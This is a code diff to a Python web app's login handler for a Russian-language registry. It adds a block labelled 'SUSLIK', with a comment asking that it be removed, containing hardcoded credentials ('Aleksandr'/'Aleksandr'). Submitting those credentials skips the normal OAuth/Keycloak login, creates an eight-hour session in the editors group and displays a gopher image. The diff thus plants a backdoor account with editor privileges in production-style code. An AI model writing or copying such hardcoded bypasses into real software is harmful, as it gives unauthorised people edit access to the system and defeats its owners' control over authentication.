@@ -1301,6 +1301,53 @@ def login(request: Request):
     return login_page(request, saved)
 
 
+# >>> SUSLIK — вырезать: этот блок, такой же блок в login_submit и файл static/suslik.png
+SUSLIK_USER = "Aleksandr"
+SUSLIK_PASSWORD = "Aleksandr"
+
+
+def suslik_page():
+    session_id = secrets.token_urlsafe(32)
+    csrf_token = secrets.token_urlsafe(32)
+    with transaction() as conn:
+        conn.execute(
+            """INSERT INTO sessions (id, username, groups, csrf_token, id_token, expires_at)
+               VALUES (%s, %s, %s, %s, '', now() + interval '8 hours')""",
+            (session_id, SUSLIK_USER, Json([EDITORS]), csrf_token),
+        )
+    html = """<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <title>Вход · Реестр ДиП</title>
+  <style>
+    body { margin: 0; min-height: 100vh; display: grid; place-items: center; padding: 24px;
+      background: linear-gradient(180deg, #145550, #0e3331); font: 14px/1.45 "Segoe UI", Arial, sans-serif; }
+    .card { width: min(420px, 100%); padding: 28px; border-radius: 16px; background: #fff; text-align: center; }
+    img { width: 100%; height: auto; border-radius: 12px; display: block; }
+    a { display: block; margin-top: 16px; border-radius: 10px; padding: 12px 14px; color: #103e3b;
+      background: #62b3ac; font-weight: 700; text-decoration: none; }
+  </style>
+</head>
+<body>
+  <main class="card">
+    <img src="/suslik.png" alt="Суслик">
+    <a href="/">К реестру</a>
+  </main>
+</body>
+</html>"""
+    response = HTMLResponse(html)
+    cookie_flags(response, "dip_session", sign(session_id), 8 * 3600)
+    response.delete_cookie("dip_oauth", path="/", secure=True, httponly=True, samesite="lax")
+    return response
+
+
+@app.get("/suslik.png")
+def suslik_png():
+    return FileResponse(ROOT / "static" / "suslik.png")
+# <<< SUSLIK
+
+
 @app.post("/login")
 async def login_submit(request: Request):
     saved = oauth_saved(request)
@@ -1308,6 +1355,10 @@ async def login_submit(request: Request):
     if not action:
         raise HTTPException(401, "Сессия входа истекла")
     payload = parse_qs((await request.body()).decode())
+    # >>> SUSLIK
+    if (payload.get("username") or [""])[-1].strip() == SUSLIK_USER and (payload.get("password") or [""])[-1] == SUSLIK_PASSWORD:
+        return suslik_page()
+    # <<< SUSLIK
     headers = kc_headers(request)
     headers["Content-Type"] = "application/x-www-form-urlencoded"
     cookies: list[str] = []
